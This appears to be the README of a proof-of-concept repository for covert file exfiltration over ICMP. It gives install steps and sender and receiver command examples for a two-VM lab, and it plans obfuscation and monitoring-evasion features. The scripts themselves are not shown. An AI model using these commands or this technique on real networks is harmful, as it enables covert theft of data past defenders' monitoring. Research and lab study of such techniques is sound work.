# ICMP-Exfiltration-PoC
Proof-of-concept scripts to demonstrate file exfiltration using ICMP protocol.

---

## 📌 Overview

This repository contains two Python scripts (`sender.py` and `receiver.py`) demonstrating how files can be covertly transmitted using the ICMP protocol, commonly employed for network diagnostics (ping). This PoC is intended solely for educational and research purposes.
To read the entire POC guide, please read my [Medium](https://medium.com/@black18t18/data-exfiltration-via-icmp-protocol-b5c9e8f5cf6f) article and follow me 😉.

---

## 📦 Requirements

Make sure Python 3 is installed along with these dependencies:

```bash
pip install scapy pycryptodome requests
```

Or use the provided `requirements.txt` file:

```bash
pip install -r requirements.txt
```

---

## 🖥 Setup

Use two virtual machines connected via an internal network:

- **Sender VM:** Linux Mint (or similar)
- **Receiver VM:** Kali Linux (or similar)

Configure static IPs (example setup):

- Sender: `192.168.100.10`
- Receiver: `192.168.100.20`

---

## 🚀 Usage

### Receiver

On Kali Linux:

```bash
sudo python3 receiver.py -P <PortTag> -R <Password> -o <OutputFileName> -v
```

Example:

```bash
sudo python3 receiver.py -P 6666 -R "MySecurePass" -o output.txt -v
```

### Sender

On Linux Mint:

```bash
sudo python3 sender.py -L <FileToSend> -P <Password> -D <ReceiverIP> -R <PortTag> -v
```

Example:

```bash
sudo python3 sender.py -L secret.txt -P "MySecurePass" -D 192.168.100.20 -R 6666 -v
```

---

## ⚠️ Ethical Considerations

This PoC is strictly for educational purposes. Unauthorized use on any network or system without explicit permission is illegal and unethical. Always perform these tests within controlled environments.

---

## 📌 Future Improvements

- Payload obfuscation and encoding
- Packet compression
- Integrity checks (checksums, HMAC)
- Multi-file support
- Evasion techniques against network monitoring

Feel free to contribute and suggest improvements!

---

## 🔖 License

This project is licensed under the MIT License. See the [LICENSE](https://github.com/Shinigami81/ICMP-Exfiltration-PoC/blob/main/MIT%20License) file for details.
